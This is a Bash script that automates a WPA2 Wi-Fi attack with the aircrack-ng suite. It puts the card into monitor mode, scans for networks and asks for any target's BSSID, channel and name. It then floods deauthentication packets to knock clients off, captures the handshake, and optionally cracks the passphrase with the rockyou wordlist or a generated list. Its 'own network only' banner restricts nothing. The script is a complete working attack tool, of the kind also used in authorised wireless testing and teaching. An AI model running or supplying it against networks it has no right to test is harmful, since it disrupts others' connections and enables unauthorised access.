#!/bin/bash
# Usage: sudo ./wpa2_hacking_script.sh

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
echo "=========================================="
echo "    FOR YOUR OWN NETWORK ONLY"
echo "=========================================="
echo -e "${NC}"

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[ERROR] Please run as root: sudo $0${NC}"
    exit 1
fi

# Configuration
INTERFACE="wlan0"
CAPTURE_FILE="wpa_test_$(date +%Y%m%d_%H%M%S)"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Function to cleanup
cleanup() {
    echo -e "${YELLOW}[INFO] Cleaning up...${NC}"
    sudo airmon-ng stop "${INTERFACE}mon" 2>/dev/null
    sudo systemctl start NetworkManager 2>/dev/null
    echo -e "${GREEN}[INFO] Cleanup completed.${NC}"
}

# Trap Ctrl+C
trap cleanup EXIT

# Step 1: Check dependencies
echo -e "${BLUE}[STEP 1] Checking dependencies...${NC}"
for tool in aircrack-ng iwconfig iw; do
    if ! command -v $tool &> /dev/null; then
        echo -e "${RED}[ERROR] $tool is not installed${NC}"
        echo "Install with: sudo apt install aircrack-ng wireless-tools"
        exit 1
    fi
done
echo -e "${GREEN}[OK] All tools are available${NC}"

# Step 2: Check wireless interface
echo -e "${BLUE}[STEP 2] Checking wireless interface...${NC}"
INTERFACE=$(iwconfig 2>/dev/null | grep -o '^[^ ]*' | head -1)
if [ -z "$INTERFACE" ]; then
    echo -e "${RED}[ERROR] No wireless interface found${NC}"
    exit 1
fi
echo -e "${GREEN}[OK] Using interface: $INTERFACE${NC}"

# Step 3: Enable monitor mode
echo -e "${BLUE}[STEP 3] Enabling monitor mode...${NC}"
sudo airmon-ng check kill
sudo airmon-ng start $INTERFACE

MON_INTERFACE="${INTERFACE}mon"
if ! iwconfig 2>/dev/null | grep -q "$MON_INTERFACE"; then
    echo -e "${RED}[ERROR] Failed to enable monitor mode${NC}"
    exit 1
fi
echo -e "${GREEN}[OK] Monitor mode enabled on $MON_INTERFACE${NC}"

# Step 4: Scan for networks
echo -e "${BLUE}[STEP 4] Scanning for networks (Ctrl+C to stop scan)...${NC}"
timeout 10 sudo airodump-ng $MON_INTERFACE

# Get target network info
echo
echo -e "${YELLOW}[INPUT] Enter target network details:${NC}"
read -p "BSSID (MAC address): " BSSID
read -p "Channel: " CHANNEL
read -p "ESSID (Network name): " ESSID

if [ -z "$BSSID" ] || [ -z "$CHANNEL" ] || [ -z "$ESSID" ]; then
    echo -e "${RED}[ERROR] Missing network information${NC}"
    cleanup
    exit 1
fi

# Step 5: Capture handshake
echo -e "${BLUE}[STEP 5] Starting handshake capture...${NC}"
echo -e "${YELLOW}[INFO] Starting capture on channel $CHANNEL - Press Ctrl+C when handshake is captured${NC}"

# Start capture in background
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $CAPTURE_FILE $MON_INTERFACE &
CAPTURE_PID=$!

# Wait a bit for capture to start
sleep 5

# Step 6: Deauthentication attack
echo -e "${BLUE}[STEP 6] Sending deauthentication packets...${NC}"
echo -e "${YELLOW}[INFO] This will temporarily disconnect clients${NC}"

for i in {1..3}; do
    echo -e "${YELLOW}[ATTEMPT $i] Sending deauth packets...${NC}"
    sudo aireplay-ng --deauth 4 -a $BSSID $MON_INTERFACE &>/dev/null
    sleep 5
    
    # Check if handshake was captured
    if aircrack-ng ${CAPTURE_FILE}-01.cap 2>/dev/null | grep -q "1 handshake"; then
        echo -e "${GREEN}[SUCCESS] WPA handshake captured!${NC}"
        break
    fi
done

# Stop capture
sudo kill $CAPTURE_PID 2>/dev/null

# Step 7: Verify handshake
echo -e "${BLUE}[STEP 7] Verifying handshake capture...${NC}"
if aircrack-ng ${CAPTURE_FILE}-01.cap 2>/dev/null | grep -q "1 handshake"; then
    echo -e "${GREEN}[SUCCESS] Handshake verified in ${CAPTURE_FILE}-01.cap${NC}"
else
    echo -e "${RED}[FAILED] No handshake captured. Try again.${NC}"
    cleanup
    exit 1
fi

# Step 8: Password cracking (optional)
echo
read -p "Do you want to attempt password cracking? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo -e "${BLUE}[STEP 8] Starting password analysis...${NC}"
    
    if [ -f "$WORDLIST" ]; then
        echo -e "${YELLOW}[INFO] Testing with wordlist: $WORDLIST${NC}"
        aircrack-ng -w $WORDLIST -b $BSSID ${CAPTURE_FILE}-01.cap
    else
        echo -e "${YELLOW}[INFO] No wordlist found. Creating small test wordlist...${NC}"
        # Create a small test wordlist
        cat > test_wordlist.txt << EOF
password
12345678
admin123
${ESSID}123
test1234
password123
EOF
        echo -e "${YELLOW}[INFO] Testing with custom wordlist...${NC}"
        aircrack-ng -w test_wordlist.txt -b $BSSID ${CAPTURE_FILE}-01.cap
    fi
fi
# Final cleanup
cleanup
echo -e "${YELLOW}[NOTE] Capture file: ${CAPTURE_FILE}-01.cap${NC}"
